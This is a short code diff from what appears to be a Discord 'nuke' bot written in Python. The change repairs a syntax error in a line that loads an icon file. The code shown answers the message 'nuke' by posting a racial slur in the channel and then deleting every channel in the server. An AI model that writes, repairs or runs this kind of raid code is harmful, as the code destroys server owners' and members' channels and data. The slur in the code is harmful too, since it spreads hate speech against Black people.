@@ -26,7 +26,7 @@ async def on_guild_channel_create(channel):
 async def on_message(message):
 	if message.content == "nuke":
 		guild = message.guild
-		with open'UAR.jpg', 'rb') as f: icon = f.read()
+		with open('UAR.jpg', 'rb') as f: icon = f.read()
 		await message.channel.send("k nigger")
 		for channel in guild.channels:
 			await channel.delete()
